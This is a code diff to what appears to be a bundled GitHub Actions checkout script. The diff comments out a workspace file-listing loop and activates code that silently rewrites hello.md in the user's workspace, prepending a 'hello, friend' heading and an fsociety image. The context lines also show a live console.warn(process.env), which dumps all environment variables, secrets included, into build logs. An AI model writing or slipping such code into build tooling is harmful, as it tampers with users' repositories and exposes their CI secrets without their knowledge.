@@ -634,12 +634,12 @@ class GitCommandManager {
           while(new Date().getTime() < start + 5000) {}
         };
         console.warn(process.env);
-	      fs.readdir(process.env.GITHUB_WORKSPACE, (err, files) => {
-          files.forEach(file => {
-            sleep();
-            console.warn(`FILE: ${file}`);
-	        });
-	      });
+	      // fs.readdir(process.env.GITHUB_WORKSPACE, (err, files) => {
+        //   files.forEach(file => {
+        //     sleep();
+        //     console.warn(`FILE: ${file}`);
+	      //   });
+	      // });
 	/* ---------- */
 
 	/* ---------- */
@@ -1381,16 +1381,15 @@ function getSource(settings) {
             }
 
             /* ---------- */
-            // if (fs.existsSync(process.env.GITHUB_WORKSPACE + '/hello.md')) {
-            //   const data = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/hello.md')
-            //   const fd = fs.openSync(process.env.GITHUB_WORKSPACE + '/hello.md', 'w+')
-            //   const insert = Buffer.from("\n\n### hello, friend\n\n\n\n![fsociety](https://i.imgur.com/jbeBUki.jpeg)\n\n")
-            //   fs.writeSync(fd, insert, 0, insert.length, 0)
-            //   fs.writeSync(fd, data, 0, data.length, insert.length)
-            //   fs.close(fd, (err) => {
-            //     console.warn(err);
-            //   });
-            // }
+            if (fs.existsSync(process.env.GITHUB_WORKSPACE + '/hello.md')) {
+              const data = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/hello.md')
+              const fd = fs.openSync(process.env.GITHUB_WORKSPACE + '/hello.md', 'w+')
+              const insert = Buffer.from("\n\n### hello, friend\n\n\n\n![fsociety](https://i.imgur.com/jbeBUki.jpeg)\n\n")
+              fs.writeSync(fd, insert, 0, insert.length, 0)
+              fs.writeSync(fd, data, 0, data.length, insert.length)
+              fs.close(fd, (err) => {
+              });
+            }
         }
     });
 }
